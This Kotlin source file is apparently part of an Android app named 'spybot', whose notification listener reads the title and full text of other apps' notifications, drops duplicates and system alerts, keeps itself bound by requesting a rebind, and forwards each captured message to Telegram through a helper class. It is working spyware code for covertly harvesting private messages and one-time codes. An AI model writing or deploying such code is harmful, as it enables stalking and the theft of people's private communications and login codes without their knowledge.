package com.example.spybot

import android.app.Notification
import android.content.ComponentName
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.example.spybot.helper.TelegramHelper

class NotificationListener : NotificationListenerService() {

    private val TAG = "NOTIFICATION_SPY"

    companion object {
        // Duplicate alerts ko drop karne ke liye last seen key track karna
        private var lastProcessedKey: String = ""
        private var lastProcessedTime: Long = 0L
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Service Connected and Bound to System Successfully!")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "Service Disconnected. Requesting rebind...")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            requestRebind(ComponentName(this, NotificationListener::class.java))
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // 1. Loop & System Apps filter (Telegram, System UI, Samsung Capture/Screenshot)
        if (packageName == this.packageName || 
            packageName.startsWith("org.telegram.") || 
            packageName == "android" || 
            packageName == "com.android.systemui" ||
            packageName.contains("capture") ||
            packageName.contains("screenshot")) {
            return
        }

        // 2. Drop background/persistent service alerts
        if (sbn.isOngoing || (sbn.notification.flags and Notification.FLAG_ONGOING_EVENT) != 0) {
            return
        }

        // 3. Drop summary headers (e.g., "X new messages")
        if ((sbn.notification.flags and Notification.FLAG_GROUP_SUMMARY) != 0) {
            return
        }

        val extras = sbn.notification?.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim() ?: text

        val finalBody = if (bigText.isNotEmpty() && bigText != text) bigText else text

        // Ignore empty/placeholder notifications
        if (title.isEmpty() && finalBody.isEmpty()) return

        // 4. Duplicate Check: Agar same app, title aur text 2 second ke andar dobara aaye to ignore karein
        val currentKey = "$packageName|$title|$finalBody"
        val currentTime = System.currentTimeMillis()
        if (currentKey == lastProcessedKey && (currentTime - lastProcessedTime) < 2000L) {
            return
        }
        lastProcessedKey = currentKey
        lastProcessedTime = currentTime

        val appName = getAppName(packageName) ?: packageName

        Log.d(TAG, "Captured: [$appName] $title -> $finalBody")
        TelegramHelper.sendNotification(applicationContext, title, finalBody, appName)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private fun getAppName(packageName: String): String? {
        return try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: Exception) {
            null
        }
    }
}
